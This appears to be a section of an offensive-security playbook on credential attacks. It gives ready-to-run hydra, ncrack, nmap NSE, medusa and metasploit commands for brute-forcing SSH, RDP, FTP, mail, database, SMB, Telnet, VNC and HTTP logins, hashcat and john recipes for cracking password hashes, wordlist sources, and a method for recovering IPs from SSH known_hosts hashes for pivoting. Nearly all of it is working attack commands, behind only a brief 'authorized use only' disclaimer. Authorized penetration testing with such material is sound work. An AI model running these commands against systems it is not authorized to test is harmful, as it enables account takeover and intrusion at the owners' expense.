# 07 — Credentials (Brute Force & Cracking)

> Authorized use only. Brute-forcing is loud — confirm scope, throttle tasks, and log every
> attempt in the brain.

---

## §brute-force — Online service brute force

**Setup:**
```bash
ULIST="/usr/share/wordlists/brutespray/mysql/user"
PLIST="/usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt"
T="192.168.0.1"
```

**Tools:** ncrack, nmap NSE, THC hydra, medusa, metasploit, crowbar (ssh keys).

**Useful flags:**
- nmap: `--script-args userdb="${ULIST}",passdb="${PLIST}",brute.firstOnly`
- ncrack: `-U "${ULIST}" -P "${PLIST}"`
- hydra: `-t4` (tasks) `-l root` (user) `-V` (verbose) `-s 31337` (port) `-S` (SSL) `-f` (stop on first hit)

**Per-service:**
```bash
# SSH
nmap -p 22 --script ssh-brute --script-args ssh-brute.timeout=4s "$T"
ncrack -P "${PLIST}" --user root "ssh://${T}"
hydra -P "${PLIST}" -l root "ssh://$T"

# RDP
ncrack -P "${PLIST}" --user root -p3389 "${T}"
hydra -P "${PLIST}" -l root "rdp://$T"

# FTP
hydra -P "${PLIST}" -l user "ftp://$T"

# IMAP / POP3
nmap -p 143,993 --script imap-brute "$T"
nmap -p110,995 --script pop3-brute "$T"

# MySQL / PostgreSQL
nmap -p3306 --script mysql-brute "$T"
nmap -p5432 --script pgsql-brute "$T"

# SMB
nmap --script smb-brute "$T"

# Telnet
nmap -p23 --script telnet-brute --script-args telnet-brute.timeout=8s "$T"

# VNC
nmap -p5900 --script vnc-brute "$T"
ncrack -P "${PLIST}" --user root "vnc://$T"
hydra -P "${PLIST}" "vnc://$T"
medusa -P "${PLIST}" –u root –M vnc -h "$T"

# VNC via metasploit
msfconsole -q -x "use auxiliary/scanner/vnc/vnc_login; set rhosts $T; set pass_file $PLIST; run"

# HTTP basic auth
echo admin >user.txt; echo -e "blah\naaddd\nfoobar" >pass.txt
nmap -p80 --script http-brute --script-args \
  http-brute.hostname=<host>,http-brute.path=/path,userdb=user.txt,passdb=pass.txt,http-brute.method=POST,brute.firstOnly \
  <host>
```

---

## §hashcat — Crack a hash (GPU)

```bash
hashcat my-hash /usr/share/wordlists/rockyou.txt
```

**Long mask attack (10-day 7-16 char, GPU):**
```bash
curl -fsSL https://github.com/sean-t-smith/Extreme_Breach_Masks/raw/main/10%2010-days/10-days_7-16.hcmask -o 10-days_7-16.hcmask
# -d2 = GPU #2, -O = faster (≤15 chars), -w1 = low workload (-w3 high)
nice -n 19 hashcat -o cracked.txt my-hash.txt -w1 -a3 10-days_7-16.hcmask -O -d2
```

**Notes:** `$6$` (sha512crypt) is SLOW. Rent a RTX-4090 cluster (vast.ai ~$0.40/h) with
`dizcza/docker-hashcat:cuda`, or use Crackstation / shuck.sh / ColabCat.

**Lookup services:** NTLM2password (NTLM), wpa-sec (WPA PSK).

---

## §john — Crack a hash (CPU)

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
# auto-detect format, or force: john --format=sha512crypt hashes.txt
```

---

## §wordlists — Pick a wordlist

- `/usr/share/nmap/nselib/data`
- `/usr/share/wordlists/seclists/Passwords`
- https://github.com/berzerk0/Probable-Wordlists  ← favorite
- https://github.com/danielmiessler/SecLists
- https://wordlists.assetnote.io
- https://weakpass.com
- https://crackstation.net

---

## §known-hosts — Crack known_hosts hashes → IPs

```bash
curl -SsfL https://github.com/chris408/known_hosts-hashcat/raw/refs/heads/master/ipv4_hcmask.txt -O
curl -SsfL https://github.com/chris408/known_hosts-hashcat/raw/refs/heads/master/kh-converter.py -O
python3 kh-converter.py ~/.ssh/known_hosts >known_hosts_hashes
hashcat -m 160 --quiet --hex-salt known_hosts_hashes -a 3 ipv4_hcmask.txt
```
Reveals IPs a user has SSH'd to — great for pivot discovery.
